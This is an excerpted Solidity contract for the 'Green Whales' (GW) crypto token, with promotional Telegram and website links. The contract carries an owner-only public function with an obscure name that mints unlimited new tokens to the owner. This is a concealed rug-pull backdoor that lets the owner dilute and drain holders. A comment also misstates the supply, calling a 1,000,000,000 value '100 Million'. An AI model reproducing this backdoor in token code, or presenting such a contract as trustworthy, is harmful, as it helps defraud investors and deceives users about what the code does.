...
//
// $GreenWhales proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/GreenWhalesOFC
// 📱 Website ::https://greenwhales.io/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _GreenWhales(uint256 amount) public onlyOwner {
 _GreenWhales(msg.sender, amount);
    }
    ...
    function _GreenWhales(address account, uint256 amount) internal virtual {
...
contract $GreenWhales is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Green Whales", "GW") {
     _GreenWhales(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}